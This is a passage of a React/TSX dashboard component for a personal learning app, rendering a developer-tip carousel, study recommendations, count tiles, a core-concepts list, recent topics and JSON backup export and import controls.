                                          <span key={topic} className="px-1.5 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-405 border border-blue-500/15 text-[8.5px] font-mono leading-none font-bold uppercase tracking-tight">
                                            {topic}
                                          </span>
                                        ))}
                                      </div>
                                    </div>
                                    
                                    <div className="flex items-center gap-1 shrink-0">
                                      <button
                                        type="button"
                                        onClick={(e) => {
                                          e.stopPropagation();
                                          setSelectedLogDate(dateStr);
                                        }}
                                        className="p-1 rounded text-slate-400 hover:text-amber-500 hover:bg-slate-100 dark:hover:bg-slate-800 transition-all cursor-pointer"
                                        title="Edit this entry"
                                      >
                                        <PenTool className="w-3.5 h-3.5" />
                                      </button>
                                    </div>
                                  </div>
                                </div>
                              );
                            })}
                        </div>
                      </div>
                    )}

                  </div>
                );
              })()}
            </div>
          </div>
        </div>

        {/* Daily Development Insights Card */}
        <div className="xl:col-span-12 lg:xl:col-span-7 bg-slate-900 text-slate-100 border border-slate-800 p-6 rounded-3xl shadow-lg text-left relative overflow-hidden flex flex-col justify-between min-h-[352px]">
          
          {/* Aesthetic mock code terminal indicators */}
          <div className="absolute right-4 top-4 flex items-center gap-1.5 select-none opacity-20">
            <span className="w-2.1 h-2.1 rounded-full bg-red-500" />
            <span className="w-2.1 h-2.1 rounded-full bg-yellow-500" />
            <span className="w-2.1 h-2.1 rounded-full bg-green-500" />
          </div>

          <div className="space-y-4">
            
            {/* Upper row header */}
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800/80 pb-3">
              <div>
                <div className="flex items-center gap-2">
                  <span className="text-[9px] font-black tracking-widest uppercase font-mono bg-blue-500/10 text-blue-400 border border-blue-500/20 px-2 py-0.5 rounded">
                    Daily Dev Insights
                  </span>
                  <span className="text-[9px] font-mono text-slate-400">
                    ⚡ Mental model booster
                  </span>
                </div>
                <h3 className="text-lg font-extrabold text-white mt-1 font-sans tracking-tight leading-none">
                  Curated Developer Tip of the Day
                </h3>
              </div>

              {/* Mastery tracking badges */}
              <div className="flex items-center gap-2">
                <span className="px-2.5 py-1 bg-slate-850 text-slate-300 text-[10px] font-mono font-bold rounded-lg border border-slate-800">
                  🏆 {mythsLearnedTotal} / {DEVELOPER_MISCONCEPTIONS.length} Mastery
                </span>
              </div>
            </div>

            {/* Carousel navigation toolbar */}
            {(() => {
              const currentInsight = DEVELOPER_MISCONCEPTIONS[currentMythIdx];
              const isMastered = !!mindBlownCount[currentInsight.id];

              return (
                <div className="space-y-4">
                  <div className="flex items-center justify-between gap-4">
                    <span className="text-[10px] font-black font-mono text-teal-400 uppercase tracking-widest px-2.5 py-1 bg-teal-500/5 rounded-md border border-teal-500/10">
                      🚀 {currentInsight.category.toUpperCase()}
                    </span>

                    <div className="flex items-center gap-1">
                      <button
                        onClick={() => {
                          setRevealMythSol(false);
                          setCurrentMythIdx((prev) => (prev - 1 + DEVELOPER_MISCONCEPTIONS.length) % DEVELOPER_MISCONCEPTIONS.length);
                        }}
                        className="px-2.5 py-1 text-[11px] font-mono font-bold text-slate-400 hover:text-white hover:bg-slate-800 rounded-lg transition-colors cursor-pointer text-xs"
                      >
                        ◀ Prev
                      </button>
                      <span className="text-xs text-slate-500 font-mono">
                        {currentMythIdx + 1} of {DEVELOPER_MISCONCEPTIONS.length}
                      </span>
                      <button
                        onClick={() => {
                          setRevealMythSol(false);
                          setCurrentMythIdx((prev) => (prev + 1) % DEVELOPER_MISCONCEPTIONS.length);
                        }}
                        className="px-2.5 py-1 text-[11px] font-mono font-bold text-slate-400 hover:text-white hover:bg-slate-800 rounded-lg transition-colors cursor-pointer text-xs"
                      >
                        Next ▶
                      </button>
                    </div>
                  </div>

                  {/* Inspected Item Panel */}
                  <div className="space-y-3">
                    <h4 className="text-md sm:text-lg font-extrabold text-slate-100 font-sans tracking-tight leading-snug">
                      "{currentInsight.title}"
                    </h4>

                    <div className="p-4 rounded-2xl border border-rose-500/15 bg-rose-500/[0.02] text-xs text-rose-300 leading-relaxed font-sans">
                      <span className="font-mono text-[9px] font-black text-rose-400 block tracking-wider uppercase mb-1">
                        🚫 THE POPULAR MYTH / BEGINNER MISTAKE:
                      </span>
                      <span>{currentInsight.myth}</span>
                    </div>
                  </div>

                  {/* Soul Solution details layout */}
                  <div className="mt-4 pt-1 border-t border-slate-850">
                    {!revealMythSol ? (
                      <div className="text-center py-2">
                        <button
                          onClick={() => setRevealMythSol(true)}
                          className="px-5 py-3 rounded-xl bg-orange-600 hover:bg-orange-500 text-white font-extrabold text-xs uppercase tracking-wider transition-all shadow-md flex items-center gap-2 mx-auto cursor-pointer font-sans"
                        >
                          <Zap className="w-4 h-4 text-yellow-300" />
                          <span>Reveal Elite Coding Solution ➔</span>
                        </button>
                      </div>
                    ) : (
                      <div className="space-y-4 animate-in zoom-in-98 duration-100">
                        <div className="p-4 rounded-xl border border-slate-800 bg-slate-950/70 text-xs text-slate-300 leading-relaxed font-sans">
                          <span className="font-mono text-[9px] font-black text-orange-400 block tracking-wider uppercase mb-1 flex items-center gap-1.5">
                            <Info className="w-3.5 h-3.5 text-orange-450" />
                            THE COGNITIVE TRUTH DEBUNKED
                          </span>
                          <span>{currentInsight.explanation}</span>
                        </div>

                        {/* Left/Right comparative panel */}
                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                          <div className="rounded-xl border border-red-950/40 bg-red-950/20 p-3.5 text-left font-mono">
                            <span className="text-[8.5px] font-black text-rose-455 uppercase tracking-widest block pb-1 border-b border-red-950/50">
                              {currentInsight.wrongCodeTitle}
                            </span>
                            <pre className="text-[10.5px] overflow-x-auto text-rose-200 mt-2 font-mono scrollbar-thin max-y-36">
                              <code>{currentInsight.wrongCode}</code>
                            </pre>
                          </div>

                          <div className="rounded-xl border border-emerald-950/40 bg-emerald-950/20 p-3.5 text-left font-mono">
                            <span className="text-[8.5px] font-black text-emerald-455 tracking-widest uppercase block pb-1 border-b border-emerald-950/50">
                              {currentInsight.rightCodeTitle}
                            </span>
                            <pre className="text-[10.5px] overflow-x-auto text-emerald-200 mt-2 font-mono scrollbar-thin max-y-36">
                              <code>{currentInsight.rightCode}</code>
                            </pre>
                          </div>
                        </div>

                        {/* Golden takeaway */}
                        <div className="p-3 bg-emerald-500/5 rounded-xl border border-emerald-500/10 text-xs text-emerald-350 flex items-center gap-2.5 text-left">
                          <span className="p-1 rounded bg-emerald-500/15 shrink-0 text-emerald-400">
                            <Check className="w-4 h-4" />
                          </span>
                          <p className="font-sans text-[11px] font-medium leading-relaxed">
                            <strong className="font-mono font-black uppercase text-[10px] text-emerald-400 block sm:inline mr-1">GOLDEN TRUTH TAKEAWAY:</strong> {currentInsight.takeaway}
                          </p>
                        </div>

                        <div className="flex flex-col sm:flex-row items-center justify-between gap-3 pt-2">
                          <p className="text-[9.5px] text-slate-500 italic font-sans">
                            💡 Build deep structural mastery by discarding brittle coding practices.
                          </p>

                          <button
                            onClick={() => {
                              if (!isMastered) {
                                setMindBlownCount((prev) => ({ ...prev, [currentInsight.id]: true }));
                                setMythsLearnedTotal((prev) => prev + 1);
                              } else {
                                setMindBlownCount((prev) => ({ ...prev, [currentInsight.id]: false }));
                                setMythsLearnedTotal((prev) => Math.max(0, prev - 1));
                              }
                            }}
                            className={`px-4 py-2 rounded-xl text-[10px] font-bold font-mono tracking-wide uppercase transition-all select-none cursor-pointer flex items-center gap-2 ${
                              isMastered
                                ? 'bg-emerald-600 text-white shadow-2xs'
                                : 'bg-slate-800 hover:bg-slate-755 text-slate-350 hover:text-white border border-slate-700'
                            }`}
                          >
                            <ThumbsUp className={`w-3.5 h-3.5 ${isMastered ? 'fill-white' : ''}`} />
                            <span>{isMastered ? '🎉 INSIGHT MASTERED!' : '😮 REINFORCE MODEL'}</span>
                          </button>
                        </div>
                      </div>
                    )}
                  </div>

                </div>
              );
            })()}

          </div>

        </div>
      </div>

      {/* Recommended study module (Screen 1 large card) */}
      {recommendation ? (
        <div className="relative overflow-hidden bg-white dark:bg-slate-900/60 rounded-3xl border border-slate-200 dark:border-slate-800 p-6 md:p-8 shadow-sm transition-all duration-300">
          
          {/* Subtle colored glow based on topic accent */}
          <div 
            className="absolute right-0 top-0 w-64 h-64 opacity-5 dark:opacity-10 pointer-events-none rounded-full blur-3xl transition-colors"
            style={{ backgroundColor: recommendation.topic.color }}
          />

          <p className="text-[10px] sm:text-xs font-extrabold tracking-widest text-slate-400 dark:text-slate-500 uppercase font-mono">
            You haven't touched this in a while
          </p>

          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-6 mt-4">
            <div className="flex items-center gap-5">
              <div 
                className="w-14 h-14 rounded-2xl flex items-center justify-center font-bold text-white shadow-soft shrink-0" 
                style={{ backgroundColor: recommendation.topic.color }}
              >
                {recommendation.subtopic.name.charAt(0).toUpperCase()}
              </div>
              <div>
                <h3 className="text-2xl font-bold font-sans tracking-tight text-slate-900 dark:text-white">
                  {recommendation.subtopic.name}
                </h3>
                <p className="text-xs text-slate-550 dark:text-slate-400 mt-1">
                  in <span className="font-semibold text-slate-700 dark:text-slate-300">{recommendation.topic.name}</span>
                </p>
              </div>
            </div>

            <button
              onClick={() => onOpenSubtopic(recommendation!.topic.id, recommendation!.subtopic.id)}
              className="inline-flex items-center justify-center gap-2 px-6 py-3 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-semibold text-sm transition-all shadow active:scale-98 cursor-pointer shrink-0"
            >
              <span>Open subtopic</span>
              <ArrowRight className="w-4.5 h-4.5" />
            </button>
          </div>
        </div>
      ) : (
        <div className="relative overflow-hidden bg-white dark:bg-slate-900/60 rounded-3xl border border-slate-205 dark:border-slate-800/40 p-6 md:p-8 text-center shadow-md">
          <div className="w-12 h-12 rounded-2xl bg-blue-50 dark:bg-blue-950/20 text-blue-600 flex items-center justify-center mx-auto mb-4">
            <Sparkles className="w-6 h-6" />
          </div>
          <h3 className="text-xl font-bold text-slate-900 dark:text-white font-sans">
            Your bookshelf is currently empty
          </h3>
          <p className="text-xs text-slate-550 dark:text-slate-400 max-w-sm mx-auto mt-2 leading-relaxed">
            Create your first learning category topic to unlock dashboard metrics, custom resources, and study assistance.
          </p>
          <button
            onClick={onTriggerNewTopic}
            className="mt-5 px-5 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-semibold text-xs uppercase tracking-wider font-mono shadow active:scale-98 transition-all"
          >
            Create first topic
          </button>
        </div>
      )}

      {/* Grid of indicators (Screen 1 horizontal counts list) */}
      <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
        
        {/* Topics Count */}
        <div 
          onClick={() => onSelectView('topicshelf')}
          className="bg-white dark:bg-slate-900/60 rounded-2xl border border-slate-200 dark:border-slate-800 p-5 flex items-center gap-4 shadow-sm hover:shadow hover:border-blue-500/40 cursor-pointer transition-all"
        >
          <div className="w-12 h-12 rounded-xl bg-blue-50 dark:bg-blue-950/20 text-blue-600 flex items-center justify-center shrink-0">
            <BookOpen className="w-5.5 h-5.5" />
          </div>
          <div>
            <p className="text-3xl font-extrabold tracking-tight text-slate-900 dark:text-white leading-none font-mono">
              {totalTopicsCount}
            </p>
            <p className="text-[10px] font-extrabold font-mono tracking-wider text-slate-400 dark:text-slate-500 uppercase mt-2">
              Topics
            </p>
          </div>
        </div>

        {/* Subtopics Count */}
        <div 
          onClick={() => onSelectView('topicshelf')}
          className="bg-white dark:bg-slate-900/60 rounded-2xl border border-slate-200 dark:border-slate-800 p-5 flex items-center gap-4 shadow-sm hover:shadow hover:border-blue-500/40 cursor-pointer transition-all"
        >
          <div className="w-12 h-12 rounded-xl bg-indigo-50 dark:bg-indigo-950/20 text-indigo-600 flex items-center justify-center shrink-0">
            <Layers className="w-5.5 h-5.5" />
          </div>
          <div>
            <p className="text-3xl font-extrabold tracking-tight text-slate-900 dark:text-white leading-none font-mono">
              {totalSubtopicsCount}
            </p>
            <p className="text-[10px] font-extrabold font-mono tracking-wider text-slate-400 dark:text-slate-500 uppercase mt-2">
              Subtopics
            </p>
          </div>
        </div>

        {/* Resources Count */}
        <div className="bg-white dark:bg-slate-900/60 rounded-2xl border border-slate-200 dark:border-slate-800 p-5 flex items-center gap-4 shadow-sm hover:shadow transition-shadow">
          <div className="w-12 h-12 rounded-xl bg-violet-50 dark:bg-violet-950/20 text-violet-600 flex items-center justify-center shrink-0">
            <FileText className="w-5.5 h-5.5" />
          </div>
          <div>
            <p className="text-3xl font-extrabold tracking-tight text-slate-900 dark:text-white leading-none">
              {totalResourcesCount}
            </p>
            <p className="text-[10px] font-extrabold font-mono tracking-wider text-slate-400 dark:text-slate-500 uppercase mt-2">
              Resources
            </p>
          </div>
        </div>

        {/* Quizzes Count */}
        <div className="bg-white dark:bg-slate-900/60 rounded-2xl border border-slate-200 dark:border-slate-800 p-5 flex items-center gap-4 shadow-sm hover:shadow transition-shadow">
          <div className="w-12 h-12 rounded-xl bg-emerald-50 dark:bg-emerald-950/20 text-emerald-600 flex items-center justify-center shrink-0">
            <HelpCircle className="w-5.5 h-5.5" />
          </div>
          <div>
            <p className="text-3xl font-extrabold tracking-tight text-slate-900 dark:text-white leading-none">
              {totalQuizzesCount}
            </p>
            <p className="text-[10px] font-extrabold font-mono tracking-wider text-slate-400 dark:text-slate-500 uppercase mt-2">
              Quizzes
            </p>
          </div>
        </div>

        {/* PDF Count */}
        <div className="bg-white dark:bg-slate-900/60 rounded-2xl border border-slate-200 dark:border-slate-800 p-5 flex items-center gap-4 shadow-sm hover:shadow transition-shadow">
          <div className="w-12 h-12 rounded-xl bg-rose-50 dark:bg-rose-950/20 text-rose-600 flex items-center justify-center shrink-0">
            <FileText className="w-5.5 h-5.5" />
          </div>
          <div>
            <p className="text-3xl font-extrabold tracking-tight text-slate-900 dark:text-white leading-none">
              {totalPdfsCount}
            </p>
            <p className="text-[10px] font-extrabold font-mono tracking-wider text-slate-400 dark:text-slate-500 uppercase mt-2">
              Pdfs
            </p>
          </div>
        </div>

      </div>

      {/* ==================== CORE CONCEPTS HUB OVERVIEW ==================== */}
      <div className="bg-slate-950 dark:bg-slate-900 rounded-3xl p-6 md:p-8 border border-slate-900 shadow-xl text-white text-left animate-in fade-in slide-in-from-bottom-2 duration-200">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-6">
          <div>
            <div className="flex items-center gap-2 font-bold font-sans text-xs tracking-widest uppercase text-emerald-400">
              <span className="text-sm">🗃️</span>
              <span>CORE STUDY CONCEPTS HUB</span>
            </div>
            <h3 className="text-xl font-bold font-sans text-white tracking-tight mt-1">
              Active Concepts Masterboard
            </h3>
            <p className="text-xs text-slate-450 mt-1">
              Access and manage your registered high-yield core concepts directly from the main control room.
            </p>
          </div>
          
          <div className="text-[10px] uppercase font-mono tracking-wider font-bold bg-slate-800 text-slate-350 px-3 py-1 rounded-lg border border-slate-700/50">
            Total active subtopics: {subtopics.length}
          </div>
        </div>

        {subtopics.length === 0 ? (
          <p className="text-sm text-slate-500 font-sans italic text-center py-12">
            No active subtopic cards registered yet. Create a topic and subtopic to begin listing study concepts.
          </p>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 max-h-[480px] overflow-y-auto pr-2 scrollbar-thin">
            {subtopics.map(sub => {
              const topic = topics.find(t => t.id === sub.topicId);
              const isAdding = addingConceptForSubIdx === sub.id;
              const conceptList = sub.coreConcepts || [];

              return (
                <div 
                  key={sub.id} 
                  className="bg-slate-900/60 dark:bg-slate-955/40 p-5 rounded-2xl border border-slate-850 hover:border-slate-800 transition-all flex flex-col justify-between"
                >
                  <div>
                    {/* Topic and Subtopic header group */}
                    <div className="flex items-start justify-between gap-2">
                      <div className="min-w-0">
                        {topic && (
                          <span 
                            className="inline-flex items-center gap-1.5 px-2 py-0.5 rounded text-[9px] uppercase tracking-wider font-bold font-mono text-white/95 mb-1 bg-opacity-10"
                            style={{ backgroundColor: `${topic.color}25`, border: `1px solid ${topic.color}45` }}
                          >
                            <span className="w-1.5 h-1.5 rounded-full" style={{ backgroundColor: topic.color }} />
                            {topic.name}
                          </span>
                        )}
                        <h4 
                          onClick={() => onOpenSubtopic(sub.topicId, sub.id)}
                          className="font-bold text-slate-100 hover:text-blue-400 text-sm font-sans tracking-tight cursor-pointer transition-colors flex items-center gap-1.5"
                          title="Open detailed study station subtopic"
                        >
                          <span>{sub.name}</span>
                          <ArrowRight className="w-3.5 h-3.5 text-slate-500 hover:text-blue-400 inline" />
                        </h4>
                      </div>

                      {/* Quick Add trigger toggle */}
                      {!isAdding && (
                        <button
                          onClick={() => {
                            setAddingConceptForSubIdx(sub.id);
                            setInlineConceptText('');
                          }}
                          className="text-[9px] uppercase font-mono tracking-wider font-bold bg-slate-800 hover:bg-slate-750 text-slate-350 hover:text-white px-2.5 py-1 rounded-md transition-colors cursor-pointer"
                        >
                          + add
                        </button>
                      )}
                    </div>

                    {/* Inline adding form */}
                    {isAdding && (
                      <div className="mt-3 bg-slate-950 p-2.5 rounded-xl border border-slate-800 flex items-center gap-1.5 animate-in fade-in slide-in-from-top-1">
                        <input
                          type="text"
                          placeholder="Type quick key-yield concept..."
                          value={inlineConceptText}
                          onChange={(e) => setInlineConceptText(e.target.value)}
                          onKeyDown={(e) => {
                            if (e.key === 'Enter') handleAddCoreConcept(sub.id);
                            if (e.key === 'Escape') setAddingConceptForSubIdx(null);
                          }}
                          className="flex-1 bg-transparent text-xs text-white placeholder-slate-500 outline-hidden font-sans py-0.5"
                          autoFocus
                        />
                        <div className="flex items-center gap-1">
                          <button
                            onClick={() => handleAddCoreConcept(sub.id)}
                            className="p-1 bg-emerald-600/25 hover:bg-emerald-600 text-emerald-400 hover:text-white rounded-md transition-all cursor-pointer"
                            title="Save Core Concept"
                          >
                            <CheckCircle2 className="w-3.5 h-3.5" />
                          </button>
                          <button
                            onClick={() => setAddingConceptForSubIdx(null)}
                            className="p-1 bg-slate-800 hover:bg-slate-705 text-slate-400 hover:text-white rounded-md transition-all cursor-pointer"
                            title="Cancel"
                          >
                            <X className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>
                    )}

                    {/* Bullet List representation */}
                    {conceptList.length === 0 ? (
                      <p className="text-[11px] text-slate-550 italic mt-3 font-sans select-none">
                        No core concepts listed for this subtopic.
                      </p>
                    ) : (
                      <ul className="space-y-1.5 mt-3 pt-2.5 border-t border-slate-850/65">
                        {conceptList.map((item, index) => (
                          <li 
                            key={index} 
                            className="group flex items-start gap-2 text-xs text-slate-350 hover:text-white transition-all py-0.5"
                          >
                            <span className="text-emerald-500 font-bold mt-0.5 select-none font-mono">•</span>
                            <span className="flex-1 leading-relaxed">{item}</span>
                            <button
                              onClick={() => handleRemoveCoreConcept(sub.id, index)}
                              className="opacity-0 group-hover:opacity-100 p-0.5 text-slate-500 hover:text-red-400 rounded transition-opacity cursor-pointer"
                              title="Remove concept text"
                            >
                              <Trash2 className="w-3 h-3" />
                            </button>
                          </li>
                        ))}
                      </ul>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* Two column lists (Screen 1 bottom row) */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        
        {/* Recent topics lists */}
        <div className="bg-white dark:bg-slate-900/60 rounded-2xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
          <div className="flex items-center justify-between mb-4">
            <h4 className="text-xs font-bold tracking-wider text-slate-500 dark:text-slate-400 font-mono uppercase">
              Recent Topics
            </h4>
          </div>

          <div className="space-y-3">
            {recentTopics.map(topic => {
              const subCount = subtopics.filter(sub => sub.topicId === topic.id).length;

              return (
                <div
                  key={topic.id}
                  onClick={() => onSelectView(topic.id)}
                  className="flex items-center justify-between p-4 rounded-xl border border-slate-100 dark:border-slate-800/60 hover:bg-slate-50 dark:hover:bg-slate-800/50 cursor-pointer active:scale-[0.99] transition-all"
                >
                  <div className="flex items-center gap-4">
                    <div 
                      className="w-10 h-10 rounded-xl flex items-center justify-center text-white font-bold"
                      style={{ backgroundColor: topic.color }}
                    >
                      {topic.name.charAt(0).toUpperCase()}
                    </div>
                    <div>
                      <h5 className="font-semibold text-slate-800 dark:text-white text-base font-sans">
                        {topic.name}
                      </h5>
                      <p className="text-xs text-slate-400 font-mono mt-0.5">
                        {subCount} subtopics registered
                      </p>
                    </div>
                  </div>
                  <ChevronRight className="w-5 h-5 text-slate-400" />
                </div>
              );
            })}

            {recentTopics.length === 0 && (
              <p className="text-xs text-slate-400 py-6 text-center italic">
                No topic cards created yet.
              </p>
            )}
          </div>
        </div>

        {/* Quizzes overview summary */}
        <div className="bg-white dark:bg-slate-900/60 rounded-2xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm flex flex-col justify-between">
          <div>
            <h4 className="text-xs font-bold tracking-wider text-slate-500 dark:text-slate-400 font-mono uppercase mb-4">
              Weakest Quizzes
            </h4>
            <div className="py-8 flex flex-col items-center justify-center text-center">
              <div className="w-12 h-12 rounded-full bg-blue-50 dark:bg-blue-950/20 text-blue-600 flex items-center justify-center mb-3">
                <CheckCircle2 className="w-6 h-6" />
              </div>
              <p className="text-sm font-semibold text-slate-950 dark:text-white">
                Take a quiz to see weak areas
              </p>
              <p className="text-xs text-slate-400 max-w-xs mt-1.5 leading-relaxed font-sans">
                Review your subtopics, start self-grading multi-choice question batches, and track structural weaknesses.
              </p>
            </div>
          </div>

          {subtopics.length > 0 && (
            <div className="pt-4 border-t border-slate-100 dark:border-slate-800/80 flex items-center justify-between">
              <span className="text-xs text-slate-500 dark:text-slate-400">Jump right into study</span>
              <button
                onClick={() => {
                  // Pick first subtopic to open
                  const firstSub = subtopics[0];
                  onOpenSubtopic(firstSub.topicId, firstSub.id);
                }}
                className="text-xs font-semibold text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-1 font-sans cursor-pointer"
              >
                <span>Launch {subtopics[0].name}</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>
            </div>
          )}
        </div>

      </div>

      {/* 📥 EXPORT & 📤 IMPORT UTILITY SECTIONS */}
      <div className="bg-white dark:bg-slate-900/60 rounded-3xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-6">
          <div className="max-w-md">
            <h4 className="text-xs font-bold tracking-wider text-slate-400 dark:text-slate-500 font-mono uppercase mb-1">
              Backup & Migrate
            </h4>
            <h3 className="text-xl font-bold text-slate-900 dark:text-white font-sans">
              Import & Export Learning Vault
            </h3>
            <p className="text-xs text-slate-500 dark:text-slate-400 mt-2 leading-relaxed">
              Compile all topics, nested subtopics, notes, videos, interview questions, code challenges, and PDFs into a single encrypted file. Export it to back up your hard work or upload it on another computer to restore everything perfectly.
            </p>
          </div>
          
          <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 shrink-0">
            {/* Export Trigger */}
            <button
              onClick={handleExportBackup}
              className="inline-flex items-center justify-center gap-2 px-5 py-3 rounded-2xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-750 text-slate-900 dark:text-white border border-slate-200 dark:border-slate-800 text-xs font-bold tracking-wider uppercase font-mono shadow-xs active:scale-[0.98] transition-all cursor-pointer"
            >
              <Download className="w-4 h-4 text-blue-600 dark:text-blue-400" />
              <span>Export Vault JSON</span>
            </button>

            {/* Import Trigger File selector wrapper */}
            <label className="relative inline-flex items-center justify-center gap-2 px-5 py-3 rounded-2xl bg-blue-600 hover:bg-blue-500 text-white font-mono text-xs font-bold tracking-wider uppercase shadow-md active:scale-[0.98] transition-all cursor-pointer">
              <Upload className="w-4 h-4 text-white" />
              <span>Import Vault Backup</span>
              <input
                type="file"
                accept=".json"
                onChange={handleImportBackup}
                className="hidden"
              />
            </label>
          </div>
        </div>

        {/* Dynamic validation messages */}
        {successMsg && (
          <div className="mt-5 p-4 bg-emerald-50 dark:bg-emerald-950/20 text-emerald-650 dark:text-emerald-400 border border-emerald-200/50 rounded-2xl flex items-start gap-3 text-xs leading-relaxed transition-all">
            <CheckCircle2 className="w-4.5 h-4.5 shrink-0 mt-0.5" />
            <span>{successMsg}</span>
          </div>
        )}

        {errorMsg && (
          <div className="mt-5 p-4 bg-red-50 dark:bg-red-950/20 text-red-650 dark:text-red-400 border border-red-200/50 rounded-2xl flex items-start gap-3 text-xs leading-relaxed transition-all">
            <ShieldAlert className="w-4.5 h-4.5 shrink-0 mt-0.5" />
            <span>{errorMsg}</span>
          </div>
        )}
      </div>

    </div>
  );
}
